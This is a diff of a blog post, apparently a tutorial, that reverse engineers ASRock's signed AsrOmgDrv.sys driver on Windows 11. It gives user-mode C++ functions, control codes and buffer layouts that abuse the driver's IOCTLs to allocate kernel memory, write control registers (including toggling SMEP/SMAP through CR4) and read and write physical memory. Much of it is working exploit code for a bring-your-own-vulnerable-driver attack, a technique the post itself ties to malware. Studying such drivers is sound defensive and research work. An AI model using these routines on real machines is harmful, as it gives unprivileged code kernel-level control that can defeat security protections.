@@ -1,28 +1,28 @@
 +++
 title = 'Vulnerable Driver Reversal'
 date = 2023-11-01T21:44:49+01:00
-draft = true
+draft = false
 +++
 
 
 
 ## Preliminary
 
-Any driver that communicates with a user-mode application is potentially vulnerable. The privileges exposed by a driver through communication are not exclusively limited to a specific user-mode application (unless the driver takes an extra step to validate a specific process, which is rare), therefore they can be reverse engineered, exploited and leveraged by any program running in `ring3`. In the past, malware developers have exploited vulnerable drivers to manipulate `MSRs`, allocate `RWX` memory in the kernel virtual address space to execute shellcode, patch system calls, or even manually map an unsigned driver - this blog post demonstrates nothing new. However, Microsoft is often quick to revoke the signatures of drivers that they consider vulnerable, which may make it problematic to find a working vulnerable driver with a viable signature on the latest versions of windows.
+Any driver that communicates with a user-mode application is potentially vulnerable. The privileges exposed by a driver through communication are not exclusively limited to a specific user-mode application (unless the driver takes an extra step to validate a specific process, which is rare), therefore they can be reverse engineered, exploited and leveraged by any program running in `ring 3`. In the past, malware developers have exploited vulnerable drivers to manipulate `MSRs`, allocate `RWX` memory in the kernel virtual address space to execute shellcode, patch system calls, or even manually map an unsigned driver - this blog post demonstrates nothing new. However, Microsoft is often quick to revoke the signatures of drivers that they consider vulnerable, which may make it problematic to find a working vulnerable driver with a viable signature on the latest versions of windows.
 
 In this blog post, we reverse engineer a working vulnerable driver (Windows 11 23H2) and communicate with it through `IOCTL` to exploit some of the many privileges it exposes: read/write control registers, manipulate `MSRS`, allocate/free contiguous physical memory, stall the processor, map physical memory, translate to physical address and more. This blog post makes it easy for a beginner reverse engineer to understand the internals of `IOCTL` operations & how to reverse communication structures effectively.
 
-The driver we will be reversing in this post is `AsrOmgDrv.sys`, which was developed by `ASRock` incorporation. This is a Taiwanese company that manufacture motherboards - so it's no wonder they produce vulnerable drivers.
+The driver we will be reversing in this post is [AsrOmgDrv.sys](https://github.com/xgtbz/AsrOmgDrv), which was developed by [ASRock](https://en.wikipedia.org/wiki/ASRock) incorporation. This is a Taiwanese company that manufacture motherboards - so it's no wonder they produce vulnerable drivers.
 
 ## Opening a handle to the driver
 
-After loading the signed driver comfortably with `NtLoadDriver`, our first step is to open a handle to it. In short, a handle is an index that represents an entry on table maintained on a process, by process basis, that points logically to a kernel object residing in kernel space. They are, in essence, a way for `ring3` applications to indirectly reference kernel objects, and to communicate with this vulnerable driver we must open one. We can do this easily with `CreateFile`, but we need to find out some information about our vulnerable driver to call this function appropriately, such as it's device name. We can obtain everything we need to complete this call very easily with some basic static analysis, but first you should understand what the device name actually is.
+After loading the signed driver, our first step is to open a handle to it. In short, a handle is an index to an entry on table maintained on a process, by process basis, that points logically to a kernel object residing in kernel space. They are, in essence, a way for `ring3` applications to indirectly reference kernel objects, and to communicate with this vulnerable driver we must open one. We can do this easily with `CreateFile`, but we need to find out some information about our vulnerable driver to call this function appropriately, such as it's device name. We can obtain everything we need to complete this call very easily with some basic static analysis, but first you should understand what the device name actually is.
 
 To be able to communicate with a driver through `IOCTL`, the driver must have setup a device object which allows the OS to interact and communicate with the driver efficiently. According to the documentation, the device object structure represents a logical, virtual, or physical device for which a driver handles `I/O` requests (communication). This structure contains various fields of useful information that the `I/O` manager or driver could use when responding to a request made by another component within the system, such as the `ReferenceCount`, which represents the number of open handles to the device object and is mainly used by the `I/O` manager, the `IRP`, which we will look at later, and the `DriverObject`. Multiple device objects could exist within a system, so they need some unique identifier that can distinguish them from one another. This is where device names come into play, providing a distinctive label for each device object, allowing applications to accurately target and communicate with the desired device/driver. The device name is defined by the driver with a call to `IoCreateDevice`, so you could quickly gain a pointer to this function from the `.idata` section and `xref` to it. We will, however, be starting from the executable entry point.
 
-So we begin our analysis at the executable entry point, which you can navigate to with `CRTL + E`. We see this routine set up the stack canary and `jmp` to the original entry point (`OEP`), where we will be obtaining all of our information required to call `CreateFile`.
+So we begin our analysis at the executable entry point, which you can navigate to with `CRTL + E` in [IDA](https://en.wikipedia.org/wiki/Interactive_Disassembler). We see this routine set up the stack canary and `jmp` to the original entry point (`OEP`), where we will be obtaining all of our information required to call `CreateFile`.
 
-```asm
+```nasm
 public start
 start proc near
 sub     rsp, 28h
@@ -45,7 +45,7 @@ result = IoCreateDevice(DriverObject, 64i64, &DestinationString);
 ``` 
 From this we can reasonably infer that the `.data` variable, "aDeviceAsromgdr" holds the name of our device, and its value is shown in disassembly the below.
 
-```masm
+```asm
 lea     rdx, aDeviceAsromgdr ; "\\Device\\AsrOmgDrv"
 lea     rcx, [rsp+68h+DestinationString] ; DestinationString
 call    cs:RtlInitUnicodeString
@@ -72,7 +72,7 @@ There are multiple types of `IOCTL` commands, but within the scope of this blog 
 
 Not all drivers are intended for communication, thus not all drivers inherently support `IOCTL` operations. You can tell if a driver supports `IOCTL` if it has created a device object, usually with `IoCreateDevice`, and has established a symbolic link, usually with `IoCreateSymbolicLink`, which is an indirect reference to the device. Evidently, our driver does both.
 
-```masm
+```nasm
 call    cs:IoCreateDevice
 test    eax, eax
 js      loc_160F2
@@ -119,22 +119,24 @@ So now you should understand step 5 of `DeviceIoControl` better - the control fl
 
 ## Locating the DeviceControl dispatch routine
 
-Getting a pointer to the `DeviceControl` dispatch routine is extremely easy. Given that the `IRP_MJ_DEVICE_CONTROL` constant is of value 0xE (meaning the `DeviceControl` dispatch routine is index 14 in the MajorFunction array), and that the start of the `MajorFunction` array is 0x70 bytes from the DriverObject, we can say that: **`offset_from_driver_object` - 0x70 = 0x70** because **0x70 / 8 = 0xE** . Therefore, **0x70 + 0x70 = `offset_from_driver_object` (0xE0)**. We divide 0x70 by 8 because each entry in the array is a pointer that occupies 8 bytes in memory.
-
-Still within the `OEP`, we can easily distinguish the `DeviceControl` dispatch routine from other dispatch routines now that we know the offset - the function being written to **`DriverObject` + 0xE0**. The psuedocode below also depicts how a single dispatch routine can be used to handle multiple I/O operations, as described earlier.
+Getting a pointer to the `DeviceControl` dispatch routine is extremely easy. Still within the `OEP`, the `IRP_MJ_DEVICE_CONTROL` constant can be used as an index into the `MajorFunction` array, whose entry would point to the `DeviceControl` dispatch routine. The psuedocode below also depicts how a single dispatch routine can be used to handle multiple I/O operations, as described earlier.
 
 ```cpp
-  if (NT_SUCCESS(IoCreateSymbolicLink(&devincename, &DestinationString)))
+
+#define IRP_MJ_DEVICE_CONTROL 14
+  if (NT_SUCCESS(IoCreateSymbolicLink(&DeviceName, &DestinationString)))
   {
-     // same dispatch routine for two of the same I/O operations
-     *(_QWORD *)(DriverObject + 0x70) = DispatchRoutine_1;
-     *(_QWORD *)(DriverObject + 0x80) = DispatchRoutine_1;
+      // start of the major function array is at driver object + 0x70
+      // same dispatch routine for two I/O operations
+      DriverObject->MajorFunction[0] = SomeDispatchRoutine;
+      DriverObject->MajorFunction[2] = SomeDispatchRoutine;
       
-     *(_QWORD *)(DriverObject + 0xE0) = ioctl_routine; // offset 0xE0
+      // *(QWORD*)(DriverObject + 0xE0)
+      DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = ioctl_routine; // offset 0xE0
       
-     // this is NOT a dispatch routine & is for unloading the driver
-     // it is not important in this blog
-     *(_QWORD *)(DriverObject + 0x68) = DriverUnload; 
+      // this is NOT a dispatch routine & is for unloading the driver
+      // it is not important in this blog
+      DriverObject->DriverUnload = DriverUnload; 
 ```
 
 ## Making sense of the arguments passed to the IOCTL handler
@@ -143,7 +145,7 @@ Still within the `OEP`, we can easily distinguish the `DeviceControl` dispatch r
 uint64_t __fastcall ioctl_routine(uint64_t a1, uint64_t a2)
 ```
 
-So now it's finally time to end our analysis of the `OEP` and move into the dispatch routine that is invoked when we make a call to `DeviceIoControl`. We know that this is `IOCTLRoutine` from the code snippet above. The first step we should take is using logic to determine the meaning of the arguments passed to this routine. If we `xref` to this function, we'll find that it is only referenced when it is being written to the `MajorFunction` array, so we can only the reconstruct the real structures of these arguments from their use within the function, but before we do this, you should be introduced to the `SystemBuffer` field under the `IRP`.
+So now it's finally time to end our analysis of the `OEP` and move into the dispatch routine that is invoked when we make a call to `DeviceIoControl`. We know that this is `ioctl_routine` from the code snippet above. The first step we should take is using logic to determine the meaning of the arguments passed to this routine. If we `xref` to this function, we'll find that it is only referenced when it is being written to the `MajorFunction` array, so we can only reconstruct the real structures of these arguments from their use within the function, but before we do this, you should be introduced to the `SystemBuffer` field under the `IRP`.
 
 ### IRP->SystemBuffer
 
@@ -201,63 +203,33 @@ if ( *(_BYTE *)IoStackLocation != 14 )
           if ( StatusCode < 0 )
 ```
 
-This code snippet teaches us more about how control codes are used to allow a user-mode application to specify what operations they want to get executed. If I wanted `sub_11F48` to be called, I would pass in the control code `0x222880u` to `DeviceIoControl`. Below you can see the logic of `sub_11F48` in the psuedocode, keep in mind the argument passed to it - which is the buffer that data gets written to/read from. This is the first communication structure we will recreate.
+This code snippet teaches us more about how control codes are used to allow a user-mode application to specify what operations they want to get executed. If I wanted `sub_11F48` to be called, I would pass in the control code `0x222880u` to `DeviceIoControl`. Below you can see the logic of `sub_11F48` in the psuedo-code, keep in mind the argument passed to it - which is the buffer that data gets written to/read from. This is the first communication structure we will recreate.
 
 ```cpp
-NTSTATUS __fastcall sub_11F48(unsigned int *CommunicationBuffer)
+
+__int64 __fastcall sub_11F48(unsigned __int64 *ComunicationBuffer)
 {
   __int64 ContiguousMemorySpecifyCache; // rax
 
-  *((QWORD *)CommunicationBuffer + 1) = 0i64;
+  ComunicationBuffer[1] = 0i64;
   ContiguousMemorySpecifyCache = MmAllocateContiguousMemorySpecifyCache(
-                                   *CommunicationBuffer,
-                                   0x100000,
-                                   4026531840,
-                                   0x10000,
+                                   *(unsigned int *)ComunicationBuffer,
+                                   0x100000i64,
+                                   4026531840i64,
+                                   0x10000i64,
                                    0);
-                                   
-  *((QWORD *)CommunicationBuffer + 1) = ContiguousMemorySpecifyCache;
-  if ( not ContiguousMemorySpecifyCache ) return STATUS_UNSUCCESSFUL;
-    
-  CommunicationBuffer[1] = MmGetPhysicalAddress(ContiguousMemorySpecifyCache);
+  ComunicationBuffer[1] = ContiguousMemorySpecifyCache;
+  if ( !ContiguousMemorySpecifyCache )
+    return STATUS_UNSUCCESSFUL;
+  *((_DWORD *)ComunicationBuffer + 1) = MmGetPhysicalAddress(ContiguousMemorySpecifyCache);
   return 0i64;
 }
-```
-
-The first important thing we should take notice of in this psuedocode is the write to `CommunicationBuffer + 1`. In C, we know that an array will decay to a pointer to the first element in a range of contiguous elements, so  `*((QWORD *)CommunicationBuffer + 1)` must be identical to `CommunicationBuffer[1]`. So straight away, we know when this dispatch routine handler is invoked, it takes the input buffer and makes a write 8 bytes down with the value 0. The use and type of the previous 8 bytes below the starting address of the write are currently unknown. They could be two 32-bit integers, one 64-bit integer, 8 8-bit integers etc; right now we just know that 8 bytes down the start of the buffer is a 64-bit integer, because of the 0i64 written into it. Now you may have falsely made the assumption that because 8 bytes down the buffer is a 64-bit integer, the first subobject in this contiguous buffer is guaranteed to be a 64-bit integer, because arrays always consists of subojects of the same type. However, it is not mandatory that the buffer in `METHOD_BUFFERED` `IOCTL` operations must be an array. They can be structures or trivial classes in which the space occupied by each suboject in the buffer differs, essentially a heterogeneous array - this is actually quite common. So, when deducing the type of an element in the buffer/communication structure, it should not be generalised based on the type of one of its members in the contiguous array, but how it is used within the dispatch routine (or the routine called by the dispatch routine that maps to the control code specified). In this case, the subojects are of the same type, so the buffer can be constructed as a normal array. I came to this conclusion by looking at the use of the first subobject, and we see it's the first argument in `MmAllocateContiguousMemorySpecifyCache`. The documentation for this routine states that this argument should be of type `int64`, which is the same type as the second subobject in the buffer. Furthermore, the purpose of this argument is to represent the amount of bytes that should be allocated with `MmAllocateContiguousMemorySpecifyCache`, so the first subobject in our buffer should be representative of this. The use of the second argument is better understood if the buffer were manipulated structurally, so I've casted the buffer to a `UNICODE_STRING`, which you can see below, along with the layout of `UNICODE_STRING`
-
-```cpp
-struct _UNICODE_STRING
-{
-    USHORT Length;                                                          //0x0
-    USHORT MaximumLength;                                                   //0x2
-    WCHAR* Buffer;                                                          //0x8
-}; 
-
-NTSTATUS __fastcall sub_11F48(_UNICODE_STRING *CommunicationBuffer)
-{
-  WCHAR *ContiguousMemorySpecifyCache; // rax
-
-  CommunicationBuffer->Buffer = 0i64;
-  ContiguousMemorySpecifyCache = (WCHAR *)MmAllocateContiguousMemorySpecifyCache(
-                                            *(unsigned int *)&CommunicationBuffer->Length,
-                                            0x100000i64,
-                                            4026531840i64,
-                                            0x10000i64,
-                                            0);
-  CommunicationBuffer->Buffer = ContiguousMemorySpecifyCache;
-  if ( !ContiguousMemorySpecifyCache ) return STATUS_UNSUCCESSFUL;
-  
-  *(_DWORD *)(&CommunicationBuffer->MaximumLength + 1) = 
-  				MmGetPhysicalAddress(ContiguousMemorySpecifyCache);
-  return 0;
- }
  ```
 
- We initially see nothing unusual, there is a write to 8 bytes down (`UNICODE_STRING->Buffer`) the beginning of the buffer with the return value of `MmAllocateContiguousMemorySpecifyCache`, which is the start of the system virtual memory that we allocated - this is what we expected. However, we later then see `*(DWORD *)(&CommunicationBuffer->MaximumLength + 1)` - which is `*((QWORD *)CommunicationBuffer + (1/2))` - being written to with the physical address, meaning the last 32 bits of the first subobject within the buffer gets overwritten from the amount of memory we want to allocate to the 32 bits from the physical address returned by `MmGetPhysicalAddress`. This is interesting, because it indicates to us that our communication structure should be not be an array of 2 int64s, but 2 int32s and 1 int64. The first subobject of type int32 in our buffer should specify the size, as usual. The second subobject of type int32 should represent 32 bits from the physical address that maps to the kernel memory we allocated, and the third (int64) should remain the same (return value of `MmAllocateContiguousMemorySpecifyCache`). This way, no bytes are overwritten. However, the price to pay for this structural change is that the maximum amount of memory that could be possibly allocated has been truncated to `(2 ^ 32)`, from `(2 ^ 64)`, which is fortunately still a lot of memory. So now, we have two possible options for our communication structure that will server as the `InputBuffer` to `DeviceIoControl`. If you somehow haven't noticed already, size is the only member/suboject we have to specify, and our driver returns to us the physical address and start of the kernel virtual range.
+The first important thing to note is that 8 bytes down our communication buffer is being overwritten with 0. This indicates to the client sending the IOCTL request that this field in our communication structure can be left uninitialised. Before we continue analysisng this function, we should recognise that all our communication structure is, is an array of bytes. Although the psuedo-code presents it as an array of `QWORD` objects, a communication buffer can be a tuple of heterogenous objects represented by a trivial class, or just a regular array; just a byte sequence. When we identify the second instance where the `CommunicationBuffer` is being referenced, we can see the element or field in our communication buffer is being treated as a `DWORD` object as the first argument to `MmAllocateContiguousMemorySpecifyCache` to represent the size of the allocation, which corroborates the point presented above. Then, 8 bytes down ( represented by the expression `CommunicationBuffer[1]` ) our communication buffer, which was set to 0 at the start of the function, is being reinitialised with the base of the contiguous memory, in other words the return value of `MmAllocateContiguousMemorySpecifyCache`. This field will get set regardless of whether or not the allocation succeeded, so the client ( our usermode process ) should take that into consideration. Lastly, the physical address of the allocation is set 4 bytes down ( represented by the expression `*((_DWORD *)ComunicationBuffer + 1)` ) the communication buffer. From this we can deduce the total size of the communication buffer in this instance is 16 bytes. Whether we - as the client making the IOCTL request - treat this as an array of two `QWORD`s or a structure consisting of two `DWORD` objects followed by a `QWORD` object depends on our intentions, though the latter method is likely what `ASRock` intended when developing this driver. In the case of the former, one of our `QWORD` objects will be overwritten with the physical address, however the maximum amount of memory we can allocate is 2^64 (case 2). With the latter case, the maximum amount of memory we can allocate has been truncated to 2^32, which is still fortunately plenty. Moreover, in this case, no bytes get overwritten (case 1). Below shows the different communication structures we can devise with this information.
 
  ```c++
- // case 1 (no bytes are overwritten but maximum memory that can be allocated is truncated):
+ // case 1 (idiomatic method, no bytes are overwritten but maximum memory that can be allocated is truncated):
 
 #pragma pack(push, 1)
 typedef struct _ALLOCATE_CONTIGUOUS_MEMORY
@@ -313,7 +285,7 @@ bool allocate_kernel_memory(unsigned __int64 size, OUTPUT_INFORMATION& info)
 }
 ```
 
-The virtual memory manager does not ensure memory allocated in system space will not exceed the lifetime of the component that allocated it. This means using a vulnerable driver to allocate memory puts us at risk of a memory leak, when we unload the driver without freeing any memory, all our allocations are still active. Luckily, this driver exposes `MmFreeContiguousMemorySpecifyCache as well`. Before we move on, we should note that the protection of this allocated memory is not necessarily `RWX`. With virtualisation based security (`VBS`) & memory integrity (`HVCI`) enabled, `EPTEs` trump the normal description placed on virtual memory by `PTEs`, ensuring that no kernel page, except special kernel pages, can be `RWX`. This blog isn't at all about these topics, so we should move on, just note that these security mechanisms are enabled on default windows 11.
+The virtual memory manager does not ensure memory allocated in system space will not exceed the lifetime of the component that allocated it. This means using a vulnerable driver to allocate memory puts us at risk of a memory leak, when we unload the driver without freeing any memory, all our dynamic allocations are still active. Luckily, this driver exposes `MmFreeContiguousMemorySpecifyCache` as well. Before we move on, we should note that the protection of this allocated memory is not necessarily `RWX`. With [virtualisation based security](https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs) & memory integrity (`HVCI`) enabled, [extended/nested page tables](https://en.wikipedia.org/wiki/Second_Level_Address_Translation) trump the normal description placed on virtual memory by `PTEs`, ensuring that no kernel page, except special kernel pages, can be `RWX`. This blog isn't at all about these topics, so we should move on, just note that these security mechanisms are enabled on default windows 11.
 
 ## Free Contiguous Memory
 
@@ -324,7 +296,7 @@ The virtual memory manager does not ensure memory allocated in system space will
     goto LABEL_132;
 ```
 
-Using the tactics described in the previous section, we can construct our communication buffer and send a request to the vulnerable driver with the appropriate control code `0x222884`. The driver allows us to specify the range (size) we want to free, which will be the second subobject in the buffer, and of course the starting address of the buffer that is to be freed, which will be the first. Like last time, we can pass a normal array or a structure, but the maximum number of subobjects is 2. The structure would consist of an int32 and an `int64` in that order, and the array would have to be of type `int64`. I will show the code example below using a structure this time, so we know how to communicate in both ways.
+Using the tactics described in the previous section, we can construct our communication buffer and send a request to the vulnerable driver with the appropriate control code `0x222884`. The driver allows us to specify the range (size) we want to free, which will be the second subobject in the buffer, and of course the starting address of the buffer that is to be freed, which will be the first. Like last time, we can pass a normal array or a structure, but the required number of subobjects is 2. The structure would consist of an `int32` and an `int64` respectively, and the array would have to be of type `int64`. I will show the code example below using a structure this time, so we know how to communicate in both ways.
 
 ```cpp
 #pragma pack(push, 1)
@@ -401,7 +373,7 @@ unsigned __int64 read_cr(uint64_t control_reg)
 
 At this point, you can see how easy it is to exploit vulnerable drivers. For the following vulnerabilities that are exploited similarly to the ones described in the previous section, I'll just be showing the disassembly or psuedocode with a basic description, along with the communication structures and a function demonstrating communication.
 
-Being able to write to control registers is a very powerful vulnerability. For example, when we load `CR3` with a different physical address, we establish a whole new & different `VA -> PA` translation - we  are, in essence, in a new virtual address space. We can also see that we can change the `IRQL` (`writecr8`), though user-mode code is always executed at passive level, and so are most dispatch routines. We should not forget about `CR4`, with which we can toggle `SMEP/SMAP` (not reliable on newer versions of windows). With great power comes great responsibility, so this set of vulnerabilities should be used under extreme caution, for your own device's safety. The structure for this communication buffer is identical to the first one, but this time there is no data returned to us from the driver, and we have to populate each & every subobject with a value. The first being the control register we want to write to, and the second, the value to be written. For the sake of brevity, we will continue to use an array as our communication buffer.
+Being able to write to control registers is a very powerful vulnerability. For example, when we load `CR3` with a different physical address, we establish a whole new & different virtual to physical translation - we are, in essence, in a new virtual address space. We can also see that we can change the `IRQL` (`writecr8`), though user-mode code is always executed at passive level, and so are most dispatch routines. We should not forget about `CR4`, with which we can toggle `SMEP/SMAP` (not reliable on newer versions of windows). With great power comes great responsibility, so this set of vulnerabilities should be used under extreme caution, for your own device's safety. The structure for this communication buffer is identical to the first one, but this time there is no data returned to us from the driver, and we have to populate each & every subobject with a value. The first being the control register we want to write to, and the second, the value to be written. For the sake of brevity, we will continue to use an array as our communication buffer.
 
 ```cpp
 bool write_cr(uint64_t ControlRegister, DWORDLONG NewValue)
@@ -417,72 +389,58 @@ bool write_cr(uint64_t ControlRegister, DWORDLONG NewValue)
 }
 ```
 
-You should get the hang of it now, so I'll leave the vulnerable driver at the end so you can reverse every vulnerability yourself since this process is becoming more repetitive than informative. But before I do that, we'll go over one last vulnerability.
+You should get the hang of it now, so I'll leave the vulnerable driver at the end so you can reverse every vulnerability yourself since this process is becoming more repetitive than informative. But before I do that, we'll go over one last vulnerability mentioned in the introduction.
 
 ## Read/Write Physical Memory
 
 ```cpp
-mapped_buffer_1 = MmMapIoSpace(SystemBuffer->PhysicalAddress, SystemBuffer->Flags, 0i64);
-  if ( mapped_buffer_1 )
-  {
-    return_buffer = (WCHAR *)SystemBuffer->Name;
-    number_of_bytes = SystemBuffer->Flags;
-    mapped_buffer = (int *)mapped_buffer_1;
-    while ( number_of_bytes )
+    MappedVirtualMemory = MmMapIoSpace(*CommunicationBuffer, *((unsigned int *)CommunicationBuffer + 2), 0i64);
+    if ( MappedVirtualMemory )
     {
-      DataType = *(&SystemBuffer->Flags + 1);
-      if ( DataType )
+      v20 = (int *)CommunicationBuffer[2];
+      NumberOfBytes = *((_DWORD *)CommunicationBuffer + 2);
+      while ( NumberOfBytes )
       {
-        v35 = DataType - 1;
-        if ( v35 )
+        Type = *((_DWORD *)CommunicationBuffer + 3);
+        if ( Type )
         {
-          if ( v35 == 1 )
+          if ( --Type )
           {
-            value = *mapped_buffer++;
-            *(_DWORD *)return_buffer = value;
-            return_buffer += 2;
-            number_of_bytes -= 4;
+            if ( Type == 1 )
+            {
+              v25 = *v20++;
+              *(_DWORD *)MappedVirtualMemory = v25;
+              MappedVirtualMemory += 4i64;
+              NumberOfBytes -= 4;
+            }
+          }
+          else
+          {
+            v26 = *(_WORD *)v20;
+            v20 = (int *)((char *)v20 + 2);
+            *(_WORD *)MappedVirtualMemory = v26;
+            MappedVirtualMemory += 2i64;
+            NumberOfBytes -= 2;
           }
         }
         else
         {
-          word_value = *(_WORD *)mapped_buffer;
-          mapped_buffer = (int *)((char *)mapped_buffer + 2);
-          *return_buffer++ = word_value;
-          number_of_bytes -= 2;
+          v27 = *(unsigned __int8 *)v20;
+          v20 = (int *)((char *)v20 + 1);
+          *(_BYTE *)MappedVirtualMemory++ = v27;
+          --NumberOfBytes;
         }
       }
-      else
-      {
-        byte_value = *(unsigned __int8 *)mapped_buffer;
-        mapped_buffer = (int *)((char *)mapped_buffer + 1);
-        *(_BYTE *)return_buffer = byte_value;
-        return_buffer = (WCHAR *)((char *)return_buffer + 1);
-        --number_of_bytes;
-      }
+      MmUnmapIoSpace(MappedVirtualMemory, *((unsigned int *)CommunicationBuffer + 2));
+      StatusCode = 0; // success
     }
-    MmUnmapIoSpace(mapped_buffer_1, SystemBuffer->Flags);
-    v30 = 0;
-  }
+    else
+    {
+      StatusCode = 0xC0000001; // unsuccessful
+    }
 ```
 
-Let's analyse the psuedocode above line by line and try to make sense of what's going on. I have casted the communication buffer `(SystemBuffer)` to a structure type of `RTL_QUERY_REGISTRY_TABLE` and renamed the fields, which will help us understand the alignment of the different fields within the communication buffer we will be constructing. I will be referring to the `RTL_QUERY_REGISTRY_TABLE` structure as 'RtlQ' from now on. The layout of this structure is shown below. 
-
-```cpp
-struct _RTL_QUERY_REGISTRY_TABLE
-{
-    LONG (*QueryRoutine)(WCHAR* arg1, ULONG arg2, VOID* 
-        arg3, ULONG arg4, VOID* arg5, VOID* arg6);  //0x0
-    ULONG Flags;                                    //0x8
-    WCHAR* Name;                                    //0x10
-    VOID* EntryContext;                             //0x18
-    ULONG DefaultType;                              //0x20
-    VOID* DefaultData;                              //0x28
-    ULONG DefaultLength;                            //0x30
-};
-```
-
-On the first line we see a call to `MmMapIoSpace`, which maps a physical address range in the virtual `system PTE` range. It uses a physical address provided by our communication buffer, which should be the first suboject, and the amount of bytes from the physical range that should be mapped, which should be the next subobject. `SystemBuffer->PhysicalAddress` has the same offset from the beginning of `SystemBuffer` as `RtlQ->QueryRoutine` does from `RtlQ` (an offset of 0), and they are both the size of an `int64`. This means that the next subobject, which we've already identified as the number of bytes to be mapped, should start at `(SystemBuffer + 0x8)`, making `SystemBuffer->NumberOfBytes` have the same offset as `RtlQ->Flags` from the beginning of the structure. After the call to `MmMapIoSpace` is made, it's return value is checked, and if the function fails the `StatusCode` of the `IOCTL `operation is set to `0xC0000001 (STATUS_UNSUCCESSFUL)`. In the case that the call did succeed, we begin iterating under the condition that the number of bytes is greater than zero. Now, another subobject within our communication buffer is introduced, which I've named `DataType` for now. In the case that this value is 0, we `jmp` to the block of code down below.
+Let's analyse the psuedocode above line by line and try to make sense of what's going on. On the first line we see a call to `MmMapIoSpace`, which maps a physical address range in the virtual `system PTE` range. It uses a physical address provided by our communication buffer, which should be the first suboject, and the amount of bytes from the physical range that should be mapped, which should be the next subobject. The field `SystemBuffer->PhysicalAddress` has an offset of 0 from the beginning of the structure, this means that the next subobject, which we've already identified as the number of bytes to be mapped, should start at `(SystemBuffer + 0x8)`. This is referred to as `NumberOfBytes` in the psuedocode. After the call to `MmMapIoSpace` is made, it's return value is checked, and if the function fails the `StatusCode` of the `IOCTL `operation is set to `0xC0000001 (STATUS_UNSUCCESSFUL)`. In the case that the call did succeed, we begin iterating under the condition that the number of bytes is greater than zero. Now, another subobject within our communication buffer is introduced, which I've named `DataType` for now. In the case that this value is 0, we `jmp` to the block of code down below.
 
 ```cpp
        	byte_value = *(unsigned __int8 *)mapped_buffer;
@@ -498,7 +456,7 @@ From this psuedocode, it is clear that this is a read operation. First, the valu
     return_buffer = (wchar_t *)SystemBuffer->ReturnBuffer;
 ```
 
-After the copy, we increment the return_buffer to point to the byte after where the new data was copied. Then, the `NumberOfBytes` is decremented to indicate that we have copied one byte. When all the bytes are copied, `NumberOfBytes` will equal zero, and the loop will break. So, essentially, we map a physical range to a `system PTE` virtual range and then copy the contents of that range, byte by byte, into a user-mode buffer. Now we see that the other two options specified by the value of `DataType` only differ in the way they copy each section of memory. If `DataType` is 2, then data will be copied as `DWORD` (4 bytes) chunks, and if `DataType` is 1, it'll be copied as `WORDS` (2 bytes). Knowing this, we can reconstruct the psuedocode to make it easily understandable
+After the copy, we increment the `return_buffer` to point to the byte after where the new data was copied. Then, the `NumberOfBytes` is decremented to indicate that we have copied one byte. When all the bytes are copied, `NumberOfBytes` will equal zero, and the loop will break. So, essentially, we map a physical range to a `system PTE` virtual range and then copy the contents of that range, byte by byte, into a user-mode buffer. Now we see that the other two options specified by the value of `DataType` only differ in the way they copy each section of memory. If `DataType` is 2, then data will be copied as `DWORD` (4 bytes) chunks, and if `DataType` is 1, it'll be copied as `WORDS` (2 bytes). Knowing this, we can reconstruct the psuedocode to make it easily understandable
 
 ```cpp
 #define SIZEOF_DWORD 4
@@ -571,6 +529,6 @@ The control code for this operation is `0x222808`, so you now have all the infor
 
 ## Conclusion
 
-Now you should be able to reverse drivers for their device name, communication structures, control codes and understand the logic of the different operations. You should also understand how `IOCTL` works internally, at a high level. We've looked at `R/W` control registers, allocate and release kernel memory and `R/W` physical memory. There are still a lot of different vulnerabilities that this driver exposes, so you can download it and continue reversing it for yourself here https://github.com/xgtbz/AsrOmgDrv.
+Now you should be able to reverse drivers for their device name, communication structures, control codes and understand the logic of the different operations. You should also understand how `IOCTL` works internally, at a high level. We've looked at `R/W` control registers, allocate and release kernel memory and `R/W` physical memory. There are still a lot of different vulnerabilities that this driver exposes, so you can download it and continue reversing it for yourself [here](https://github.com/xgtbz/AsrOmgDrv).
 
 
